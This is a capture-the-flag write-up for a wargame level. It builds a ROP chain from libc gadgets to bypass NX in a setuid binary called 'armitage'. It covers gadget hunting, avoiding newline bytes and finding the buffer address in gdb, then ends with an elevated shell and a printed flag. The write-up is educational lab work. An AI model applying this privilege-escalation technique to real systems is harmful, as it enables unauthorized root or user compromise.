## Level 03

Level 3 starts off with the binary `amritage` and running `checksec` on it tells us we can no longer use the same exploits that have used in the previous levels:

```bash
level03@rainfall:~$ checksec armitage
[*] '/home/level03/armitage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

As you can see, `NX` is set to `Enabled` which means that the stack (or any other writable data segment) is not executable.
We'll not be able to simply place our payload onto the stack and execute it right there.
Instead we're going to have to look into [Return Oriented Programming](https://en.wikipedia.org/wiki/Return-oriented_programming).

ROP attacks can bypass stack execution protection because the code we'll be executing is not part of our payload, instead our payload will use the already present instruction in the binary itself.
These instructions are called `gadgets` and by chaining them together we will be able to spawn a shell.

Our goal with these `gadgets` is to fill the `rdi` register with the `"/bin/sh"` string, the `rsi` with the strings `"/bin/sh"`, `"-p"` and a `NULL` pointer, finally `rdx` also needs to be filled with a `NULL` pointer.
After we have set these registers we want to invoke the syscall for `execve`.

The assembly will need to represent the following:

```asm
    pop %rdi ; pop the pathname ("/bin/sh")
    pop %rsi ; pop the argv ("/bin/sh", "-p", NULL)
    pop %rdx ; pop the envp (NULL)
    pop %rax ; pop the value 59 (syscall for execve)
    syscall
```

### Gadgets

To find the instructions within the `armitage` binary a very nice tool called `ROPgadgets`.
Since the binary also uses some libraries we can use these in our exploit as well.
Lets first find out which libs are used by `armitage`:

```bash
level03@rainfall:~$ ldd ./armitage
	linux-vdso.so.1 (0x00007ffff7fc3000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc5000)
```

Using `lld` we can see which libs are used, and their base addresses.
Now we can inspect the `armitage` binary, `libc` and `ld-linux` to find the gadgets we'll need.
As it happens to be, `libc` contains all the gadgets we'll need:

```bash
level03@rainfall:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": pop rdi ; ret"
0x000000000010f78b : pop rdi ; ret
0x0000000000126295 : pop rdi ; retf
```

```bash
level03@rainfall:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": pop rsi ; ret"
0x0000000000110a7d : pop rsi ; ret
0x0000000000166b96 : pop rsi ; ret 9
0x00000000000695e2 : pop rsi ; retf
```

Do notice how this address contains the byte `0x0a`, when translated to ascii this would be a `newline`.
And since our input gets handled by `gets` which stops on a `newline` we cannot use this gadget.
We'll need to find another one that can do the same thing.
Neither the binary or any of the linked libs have a clean gadget that only does a `pop rsi` into a `ret`.
Instead we can look for one that does an additional `pop`, for example into the `rbp` register.

```bash
level03@rainfall:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": pop rsi ; pop rbp ; ret"
0x000000000002b46b : pop rsi ; pop rbp ; ret
```

```bash
level03@rainfall:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": pop rax ; ret"
0x00000000000dd237 : pop rax ; ret
0x000000000014f6bc : pop rax ; ret 0xb
0x0000000000063d14 : pop rax ; retf
```

```bash
level03@rainfall:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep ": syscall"
0x00000000000288b5 : syscall
```

As you can see there is no gadget for the instruction `pop %rdx` as the `%rdx` register is already set to `NULL` we wont need it.

### Payload

To start with our payload we'll need to figure out a couple of things.
We already know the addresses of our gadgets (by using `lld` we can see the base address of `libc`).
We also need to know the address of our `msg` array, found inside the `queue_job` function which will be the entry of our payload:

```bash
env -i gdb -nx ./armitage
    ...
(gdb) disas queue_job
Dump of assembler code for function queue_job:
   0x00000000004012eb <+0>:	endbr64
   0x00000000004012ef <+4>:	push   %rbp
   0x00000000004012f0 <+5>:	mov    %rsp,%rbp
   0x00000000004012f3 <+8>:	add    $0xffffffffffffff80,%rsp
   0x00000000004012f7 <+12>:	mov    0x2fb3(%rip),%eax        # 0x4042b0 <job_count>
   ...
```

We can set a breakpoint at the address `*0x00000000004012f7` and inspect the `rsp` register.
To make sure GDB does not run with a changed `env` we'll unset all the variables, including the `LINES` and `COLUMNS` that `gdb` adds:

```bash
level03@rainfall:~$ env -i gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS" -ex "b *0x00000000004012f7" -ex run ./armitage
    ...
Breakpoint 1, 0x00000000004012f7 in queue_job ()
(gdb) i r rsp
rsp            0x7fffffffec50      0x7fffffffec50
```

We now have all the things we'll need to craft our specific payload!
There is a really nice `python` library, `pwn` that we'll be using to generate a payload.
This lib could for example generate the entire ROPchain, but since this is not educational we've decided to do this manually.

We have included the [exploit.py](./exploit.py) file that creates the payload for us.

All there is left to do is run our `armitage`, hand it our payload and collect our flag:

```bash
level03@rainfall:~$ cat payload - | env -i PWD=$PWD $PWD/armitage
    ...
id
uid=1004(level03) gid=1006(level03) euid=1020(flag03) groups=1006(level03),1001(levelgroup)
cat /home/flag03/.pass
8c33zqo7hytqnsx9h3nb4juf3rdjbd80
```

Leaving us with the flag: `8c33zqo7hytqnsx9h3nb4juf3rdjbd80`
